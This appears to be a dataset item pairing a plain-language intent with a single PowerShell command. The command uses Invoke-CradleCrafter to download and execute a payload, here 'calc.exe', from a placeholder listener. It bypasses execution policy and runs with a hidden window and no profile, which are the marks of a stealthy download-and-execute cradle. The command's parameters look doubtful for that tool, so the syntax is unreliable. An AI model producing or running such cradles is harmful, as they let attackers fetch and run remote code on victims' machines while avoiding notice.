# Natural language intent:
# Execute PowerShell script using Invoke-CradleCrafter to download and execute 'calc.exe' payload from a specified listener.

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-CradleCrafter -Payload 'calc.exe' -Listener <YourListener>"
